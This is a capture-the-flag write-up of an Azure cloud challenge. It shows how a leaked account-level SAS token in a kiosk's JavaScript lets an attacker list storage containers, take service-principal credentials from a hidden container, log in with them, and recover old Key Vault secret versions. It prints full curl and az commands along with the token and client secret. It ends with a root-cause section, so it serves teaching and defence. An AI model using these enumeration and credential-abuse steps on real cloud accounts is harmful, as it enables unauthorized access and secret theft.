# CryptoCabana — Byte Lotus Hotel (Hacker Holidays)

**Category:** ☁️ Cloud **Difficulty:** Medium **Points:** 90 **Author:** Obito Uchiha — Team AKATSUKI

---

## 🛎️ Challenge Summary

CryptoCabana is a static "seed phrase backup kiosk" hosted on Azure Static Website hosting (`*.z13.web.core.windows.net`). The page claims it will safely back up a wallet recovery phrase to a "private vault." The goal is to figure out what the kiosk trusts client-side, follow that trust to hidden storage, and recover a set of "rotated" secrets from Azure Key Vault.

**Target:** `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`

---

## 🔍 Step 1 — Inspecting the Kiosk

Viewing page source revealed a single external script:

```html
<script src="app.js"></script>
```

Fetching `app.js` exposed the client-side backup logic:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

The page uses this SAS token to `PUT` a text blob directly into Azure Blob Storage from the browser:

```javascript
fetch(url, {
  method: "PUT",
  headers: { "x-ms-blob-type": "BlockBlob" },
  body: phrase,
});
```

### The Misconfiguration

The SAS token's parameters reveal the flaw:

|Param|Value|Meaning|
|---|---|---|
|`ss=b`|blob service|Scoped to Blob Storage|
|`srt=sco`|**s**ervice + **c**ontainer + **o**bject|Valid at the **storage-account level**, not just one container|
|`sp=rl`|read + list|Read **and list** permissions|

This is an **Account SAS**, not a container-scoped Service SAS. Even though the kiosk only ever writes to the `backups` container, the token itself is valid across the _entire storage account_ — including containers the front-end never references.

---

## 🗂️ Step 2 — Enumerating the Storage Account

Using the leaked SAS token to list containers:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

Result — **three containers**, one of which the kiosk never links to:

- `$web` (the static site itself)
- `backups` (the container the kiosk uses)
- **`vault`** ⚠️ — never referenced anywhere in the front-end

---

## 🔑 Step 3 — Looting the Vault Container

Listing blobs inside `vault`:

```bash
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=...&sig=..."
```

Two blobs found:

- `seed_phrase.txt` — a decoy planted wallet seed phrase
- `backup-service-account.json` — Azure **service principal credentials**

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"
}
```

This is the "second, more valuable set of keys" the briefing hinted at — full credentials for a service principal with access to an Azure Key Vault.

---

## 🔐 Step 4 — Authenticating to Azure

```bash
az login --service-principal \
  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  -p "UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg" \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

Login succeeded, granting access to subscription `Az-Subs-CTF` under tenant `8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c`.

---

## 🗝️ Step 5 — Enumerating Key Vault Secrets

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table
```

```
Name         Expires
-----------  -------------------------
key-shard-1
key-shard-2
key-shard-3
master-key   2020-01-01T00:00:00+00:00
```

`master-key` has an already-expired expiry date and, on inspection, an **empty value** — a decoy. The real secrets are the three key shards.

### Following @0xMia's Hint

> "if a value looks freshly rotated, ask yourself what it looked like five minutes before that"

Checking version history for each shard:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
```

`key-shard-2` had **two versions**, created just **2 seconds apart** — a clear sign of an automated "rotate on access" trap. The current (newest) version only contains a taunt:

> _"Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."_

The real value lives in the **older version**.

---

## 🏁 Step 6 — Recovering the Flag

```bash
# key-shard-1 (only one version)
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query value -o tsv
# → THM{n0t_ur

# key-shard-2 (OLD version — not the current one!)
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0 --query value -o tsv
# → _k3ys_n0t_

# key-shard-3 (only one version)
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query value -o tsv
# → ur_c01ns!}
```

Concatenating the shards in order:

```
THM{n0t_ur  +  _k3ys_n0t_  +  ur_c01ns!}
```

### 🎉 Flag: `THM{n0t_ur_k3ys_n0t_ur_c01ns!}`

---

## 📝 Root Causes / Lessons

1. **Overscoped SAS token** — an Account SAS (`srt=sco`) was used for a task that only needed a single-container Service SAS. This let a client-side, publicly-visible token enumerate the entire storage account.
2. **Security by obscurity** — the `vault` container wasn't linked anywhere, but "not linked" ≠ "not accessible" once the SAS scope leaks it.
3. **Secrets in blob storage** — service principal credentials were stored as plaintext JSON in a blob reachable by the same broad SAS token that leaked the kiosk itself.
4. **Key Vault version history** — rotating a secret doesn't erase prior versions by default. If an attacker already has vault access, old (potentially real) values remain recoverable unless explicitly purged/disabled.

---

_Solved by Obito Uchiha — Team AKATSUKI_ 🏴‍☠️